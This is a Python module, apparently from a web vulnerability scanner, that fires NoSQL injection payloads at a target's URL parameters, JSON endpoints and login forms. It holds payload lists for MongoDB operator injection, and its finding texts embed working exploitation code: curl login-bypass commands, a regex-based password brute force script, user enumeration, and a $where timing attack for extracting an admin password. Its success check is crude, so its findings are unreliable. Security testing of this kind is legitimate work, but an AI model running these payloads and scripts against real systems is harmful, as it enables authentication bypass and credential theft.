"""
NoSQL Injection Detection and Exploitation
Tests MongoDB, CouchDB, and other NoSQL databases
"""

import requests
from urllib.parse import urljoin, quote
import json

# NoSQL injection payloads
NOSQL_PAYLOADS = [
    # MongoDB authentication bypass
    {"$gt": ""},
    {"$ne": ""},
    {"$nin": [""]},
    {"$regex": ".*"},
    {"$where": "1==1"},
    {"$exists": True},
    
    # Boolean-based
    "' || '1'=='1",
    "' || 1==1//",
    "admin' || 'a'=='a",
    {"username": {"$ne": None}, "password": {"$ne": None}},
    
    # JavaScript injection
    "'; return true; var foo='",
    "1'; return true; var foo='1",
    {"$where": "function() { return true; }"},
    {"$where": "this.password.match(/.*/)"},
    
    # Timing attacks
    {"$where": "sleep(5000)"},
    {"$where": "function() { sleep(5000); return true; }"},
]

# NoSQL operator injection
NOSQL_OPERATORS = [
    "$gt", "$gte", "$lt", "$lte", "$ne", "$in", "$nin",
    "$or", "$and", "$not", "$nor", "$exists", "$type",
    "$regex", "$where", "$elemMatch", "$size"
]

def test_nosql_injection(scanner):
    """Main function to test for NoSQL injection"""
    findings = []
    
    # Get cached response
    response = scanner.get_cached_response(scanner.target_url)
    if not response:
        return findings
    
    url = response.url
    
    # Test URL parameters
    if '?' in url:
        findings.extend(_test_url_nosql(scanner, url))
    
    # Test JSON endpoints
    if 'application/json' in response.headers.get('Content-Type', ''):
        findings.extend(_test_json_nosql(scanner, url))
    
    # Test forms
    if scanner.driver:
        try:
            forms = scanner.driver.find_elements('tag name', 'form')
            for form_idx, form in enumerate(forms):
                findings.extend(_test_form_nosql(scanner, form, form_idx))
        except:
            pass
    
    return findings

def _test_url_nosql(scanner, url):
    """Test URL parameters for NoSQL injection"""
    findings = []
    base_url = url.split('?')[0]
    params_str = url.split('?')[1] if '?' in url else ''
    
    if not params_str:
        return findings
    
    # Get baseline response
    try:
        baseline_response = requests.get(url, timeout=10, verify=False)
    except:
        baseline_response = None
    
    # Parse parameters
    params = {}
    for param in params_str.split('&'):
        if '=' in param:
            key, value = param.split('=', 1)
            params[key] = value
    
    # Test each parameter
    for param_name, param_value in params.items():
        # Test string-based injection
        for payload in ["' || '1'=='1", "admin' || 'a'=='a", {"$ne": ""}]:
            test_params = params.copy()
            
            if isinstance(payload, dict):
                # JSON injection in URL (some APIs support this)
                test_params[param_name] = json.dumps(payload)
            else:
                test_params[param_name] = payload
            
            try:
                test_url = base_url + '?' + '&'.join([f"{k}={quote(str(v))}" for k, v in test_params.items()])
                test_response = requests.get(test_url, timeout=10)
                
                # Check for successful injection
                if _check_nosql_success(test_response, baseline_response):
                    scanner.add_finding(
                        severity='CRITICAL',
                        category='NoSQL Injection',
                        title=f'🔥 NoSQL Injection in URL Parameter - AUTH BYPASS!',
                        description=f'''**NOSQL INJECTION DETECTED**\n\n'''
                                  f'''Parameter: {param_name}\n'''
                                  f'''Payload: `{payload if not isinstance(payload, dict) else json.dumps(payload)}`\n'''
                                  f'''Injection Type: Authentication Bypass\n\n'''
                                  f'''**AUTHENTICATION BYPASS:**\n'''
                                  f'''```bash\n'''
                                  f'''# Bypass login with NoSQL injection:\n'''
                                  f'''curl "{base_url}?{param_name}[$ne]=" \n\n'''
                                  f'''# Extract all users:\n'''
                                  f'''curl "{base_url}?{param_name}[$regex]=.*"\n\n'''
                                  f'''# Check if admin exists:\n'''
                                  f'''curl "{base_url}?{param_name}[$regex]=^admin"\n'''
                                  f'''```\n\n'''
                                  f'''**AUTOMATED EXPLOITATION:**\n'''
                                  f'''```python\n'''
                                  f'''import requests\nimport string\n\n'''
                                  f'''# Brute force password character by character:\n'''
                                  f'''password = ""\n'''
                                  f'''while True:\n'''
                                  f'''    found = False\n'''
                                  f'''    for char in string.printable:\n'''
                                  f'''        payload = {{"$regex": f"^{{password}}{{char}}"}}\n'''
                                  f'''        params = {{"{param_name}": payload}}\n'''
                                  f'''        r = requests.get("{base_url}", json=params)\n'''
                                  f'''        if "success" in r.text:  # Adjust condition\n'''
                                  f'''            password += char\n'''
                                  f'''            print(f"[+] Password so far: {{password}}")\n'''
                                  f'''            found = True\n'''
                                  f'''            break\n'''
                                  f'''    if not found:\n'''
                                  f'''        break\n'''
                                  f'''print(f"[!] Full password: {{password}}")\n'''
                                  f'''```\n\n'''
                                  f'''**DATA EXTRACTION:**\n'''
                                  f'''```javascript\n'''
                                  f'''// MongoDB query that gets injected:\n'''
                                  f'''db.users.find({{username: {{"$ne": ""}}, password: {{"$ne": ""}}}});\n\n'''
                                  f'''// This returns ALL users, bypassing authentication\n'''
                                  f'''```''',
                        url=test_url,
                        remediation='''**CRITICAL FIX:**\n\n'''
                                  '''1. Never concatenate user input into NoSQL queries\n'''
                                  '''2. Use parameterized queries/ORM\n'''
                                  '''3. Validate and sanitize ALL input\n'''
                                  '''4. Reject requests with NoSQL operators ($gt, $ne, etc.)\n'''
                                  '''5. Implement proper authentication\n'''
                                  '''6. Use allow-lists for input validation'''
                    )
                    findings.append(True)
                    break
                    
            except Exception:
                pass
    
    return findings

def _test_json_nosql(scanner, url):
    """Test JSON endpoints for NoSQL injection"""
    findings = []
    
    # Common JSON payloads for NoSQL injection
    json_payloads = [
        {"username": {"$ne": None}, "password": {"$ne": None}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"username": "admin", "password": {"$ne": ""}},
        {"$or": [{"username": "admin"}, {"username": "administrator"}]},
        {"$where": "1==1"},
    ]
    
    for payload in json_payloads:
        try:
            # Test with different HTTP methods
            for method in ['POST', 'PUT', 'PATCH']:
                if method == 'POST':
                    test_response = requests.post(
                        url,
                        json=payload,
                        headers={'Content-Type': 'application/json'},
                        timeout=10
                    )
                elif method == 'PUT':
                    test_response = requests.put(url, json=payload, timeout=10)
                else:
                    test_response = requests.patch(url, json=payload, timeout=10)
                
                if _check_nosql_success(test_response, None):
                    scanner.add_finding(
                        severity='CRITICAL',
                        category='NoSQL Injection',
                        title=f'🔥 NoSQL Injection via JSON - FULL DATABASE ACCESS!',
                        description=f'''**JSON-BASED NOSQL INJECTION**\n\n'''
                                  f'''Method: {method}\n'''
                                  f'''Payload: ```json\n{json.dumps(payload, indent=2)}\n```\n\n'''
                                  f'''**FULL DATABASE EXTRACTION:**\n'''
                                  f'''```python\n'''
                                  f'''import requests\n\n'''
                                  f'''# Extract all records:\n'''
                                  f'''payload = {{"username": {{"$gt": ""}}, "password": {{"$gt": ""}}}}\n'''
                                  f'''r = requests.post("{url}", json=payload)\n'''
                                  f'''print(r.json())  # All user records!\n\n'''
                                  f'''# Regex-based username enumeration:\n'''
                                  f'''for char in "abcdefghijklmnopqrstuvwxyz":\n'''
                                  f'''    payload = {{"username": {{"$regex": f"^admin{{char}}"}}}}\n'''
                                  f'''    r = requests.post("{url}", json=payload)\n'''
                                  f'''    if r.status_code == 200:\n'''
                                  f'''        print(f"[+] Found user starting with: admin{{char}}")\n'''
                                  f'''```\n\n'''
                                  f'''**BLIND NOSQL INJECTION:**\n'''
                                  f'''```python\n'''
                                  f'''# Extract password using timing attacks:\n'''
                                  f'''import time\n\n'''
                                  f'''password = ""\n'''
                                  f'''while True:\n'''
                                  f'''    for char in string.printable:\n'''
                                  f'''        # Use $where with sleep for timing attack\n'''
                                  f'''        payload = {{\n'''
                                  f'''            "username": "admin",\n'''
                                  f'''            "$where": f"if(this.password.match(/^{{password}}{{char}}.*/)) {{ sleep(5000); return true; }} else {{ return false; }}"\n'''
                                  f'''        }}\n'''
                                  f'''        start = time.time()\n'''
                                  f'''        requests.post("{url}", json=payload, timeout=10)\n'''
                                  f'''        elapsed = time.time() - start\n'''
                                  f'''        \n'''
                                  f'''        if elapsed > 5:  # Delay indicates correct char\n'''
                                  f'''            password += char\n'''
                                  f'''            print(f"[+] Password: {{password}}")\n'''
                                  f'''            break\n'''
                                  f'''```''',
                        url=url,
                        remediation='Use parameterized queries. Never pass user input directly to database queries.'
                    )
                    findings.append(True)
                    return findings  # Found one, stop testing
                    
        except Exception:
            pass
    
    return findings

def _test_form_nosql(scanner, form, form_idx):
    """Test login forms for NoSQL injection"""
    findings = []
    
    try:
        action = form.get_attribute('action') or scanner.driver.current_url
        method = str(form.get_attribute('method') or 'post').upper()
        
        # Look for username/password fields
        username_field = None
        password_field = None
        
        inputs = form.find_elements('tag name', 'input')
        for inp in inputs:
            name = str(inp.get_attribute('name') or '').lower()
            if 'user' in name or 'email' in name or 'login' in name:
                username_field = inp.get_attribute('name')
            elif 'pass' in name or 'pwd' in name:
                password_field = inp.get_attribute('name')
        
        if not (username_field and password_field):
            return findings
        
        # Test NoSQL injection
        nosql_tests = [
            {username_field: "admin", password_field: {"$ne": ""}},
            {username_field: {"$ne": ""}, password_field: {"$ne": ""}},
            {username_field: "' || '1'=='1", password_field: "' || '1'=='1"},
        ]
        
        for test_data in nosql_tests:
            try:
                if method == 'POST':
                    # Try both form-encoded and JSON
                    test_response = requests.post(action, data=test_data, timeout=10, allow_redirects=False)
                    
                    if test_response.status_code in [200, 302, 301]:
                        # Check for successful login indicators
                        if any(indicator in test_response.text.lower() for indicator in ['dashboard', 'logout', 'welcome', 'profile']):
                            scanner.add_finding(
                                severity='CRITICAL',
                                category='NoSQL Injection',
                                title=f'🔥 NoSQL Injection in Login Form!',
                                description=f'''**LOGIN BYPASS VIA NOSQL INJECTION**\n\n'''
                                          f'''Form: #{form_idx}\n'''
                                          f'''Username field: {username_field}\n'''
                                          f'''Password field: {password_field}\n\n'''
                                          f'''**INSTANT ADMIN ACCESS:**\n'''
                                          f'''```bash\n'''
                                          f'''curl -X POST "{action}" \\\n'''
                                          f'''  -d '{username_field}[$ne]=' \\\n'''
                                          f'''  -d '{password_field}[$ne]='\n\n'''
                                          f'''# OR with JSON:\n'''
                                          f'''curl -X POST "{action}" \\\n'''
                                          f'''  -H "Content-Type: application/json" \\\n'''
                                          f'''  -d '{{"username": {{"$ne": ""}}, "password": {{"$ne": ""}}}}'\n'''
                                          f'''```''',
                                url=action,
                                remediation='Use parameterized queries. Never accept NoSQL operators in user input.'
                            )
                            findings.append(True)
                            return findings
                    
            except Exception:
                pass
    
    except Exception:
        pass
    
    return findings

def _check_nosql_success(test_response, baseline_response):
    """Check if NoSQL injection was successful"""
    # Status code changes
    if test_response.status_code in [200, 302, 301] and baseline_response and baseline_response.status_code != test_response.status_code:
        return True
    
    # Success indicators in response
    success_indicators = [
        'dashboard', 'logout', 'welcome', 'profile', 'admin',        'authenticated', 'success', 'token', 'session'
    ]
    
    for indicator in success_indicators:
        if indicator in test_response.text.lower():
            return True
    
    # JSON response with data
    try:
        json_data = test_response.json()
        if isinstance(json_data, list) and len(json_data) > 0:
            return True
        if isinstance(json_data, dict) and ('token' in json_data or 'auth' in json_data or 'user' in json_data):
            return True
    except:
        pass
    
    return False
